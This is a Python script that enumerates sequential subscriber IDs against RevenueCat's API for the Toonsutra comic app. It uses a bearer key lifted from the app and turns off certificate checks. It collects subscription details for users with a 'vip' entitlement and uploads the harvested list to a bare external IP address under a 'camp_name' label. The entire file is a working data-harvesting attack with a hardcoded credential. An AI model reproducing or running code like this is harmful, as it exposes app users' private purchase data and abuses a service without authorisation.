import json

import requests
import  os
import  urllib3
urllib3.disable_warnings()

def self_call_toonsurta(subs):
    url = "https://api.revenuecat.com/v1/subscribers/{}".format(subs)
    method = "get"

    headers = {
    "X-Platform-Version": "28",
    "X-Client-Version": "3.5.16",
    "Accept-Encoding": "gzip",
    "X-Client-Locale": "en-IN",
    "X-Client-Bundle-ID": "com.toonsutra.comicapp",
    "X-RevenueCat-ETag": "",
    "X-Observer-Mode-Enabled": "false",
    "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; ASUS_I005DA Build/PI)",
    "X-Version": "8.6.0",
    "X-Platform-Flavor-Version": "8.1.0",
    "X-Storefront": "IN",
    "X-Platform-Flavor": "flutter",
    "X-Platform": "android",
    "Content-Type": "application/json",
    "Authorization": "Bearer goog_brlMBCNUnCmdvWuUSmrKALFicZQ"
    }
    params = {}


    data = None


    return  requests.get(url=url,params=params,data=data,verify=False,headers=headers)


# subs = 1505526 - 25 sept
subs =1500000 #old

def pocket52(unique_in_list):
    url = 'http://54.70.36.111/backend/put_data/'
    data = json.dumps({"camp_name": "toonsutra", "data":unique_in_list})
    requests.put(url=url,data=data,verify=False)

unique_in_list= []
for i in range(1000):
    subs =subs+1
    ps_purchase = self_call_toonsurta(subs)
    if ps_purchase.status_code == 200:
        # user_is = i
        if ps_purchase.json().get('subscriber').get('entitlements').get('vip'):
            subscriber = ps_purchase.json().get('subscriber')
            subscriptions = subscriber.get('subscriptions')#extra detials1 dict
            unique_in_list.append({'user_id':subs,'details':subscriptions})
            # print(unique_in_list)

pocket52(unique_in_list)